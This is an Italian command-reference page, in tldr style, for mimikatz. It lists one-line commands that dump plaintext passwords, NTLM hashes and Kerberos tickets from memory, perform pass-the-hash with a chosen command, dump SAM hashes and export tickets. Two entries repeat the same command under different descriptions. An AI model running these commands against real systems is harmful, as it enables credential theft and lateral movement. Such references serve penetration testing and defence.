# mimikatz

> Interagisce con le credenziali di Windows, esegue dump di credenziali, manipolazione di token e altro.
> Richiede privilegi di amministratore e in genere viene eseguito su Windows.
> Maggiori informazioni: <https://github.com/gentilkiwi/mimikatz>.

- Esegui mimikatz in modalità interattiva:

`mimikatz`

- Abilita i privilegi di debug (necessari per la maggior parte delle operazioni):

`mimikatz "privilege::debug"`

- Elenca le sessioni di accesso disponibili:

`mimikatz "sekurlsa::logonpasswords"`

- Esegui il dump di password in chiaro, hash NTLM e ticket Kerberos dalla memoria:

`mimikatz "sekurlsa::logonpasswords"`

- Esegui Pass-the-Hash con un hash NTLM specifico e avvia un comando:

`mimikatz "sekurlsa::pth /user:{{username}} /domain:{{domain}} /ntlm:{{hash}} /run:{{cmd}}"`

- Esegui il dump degli hash del database SAM locale:

`mimikatz "lsadump::sam"`

- Estrai i ticket Kerberos ed esportali su file:

`mimikatz "kerberos::list /export"`

- Esci da mimikatz:

`exit`
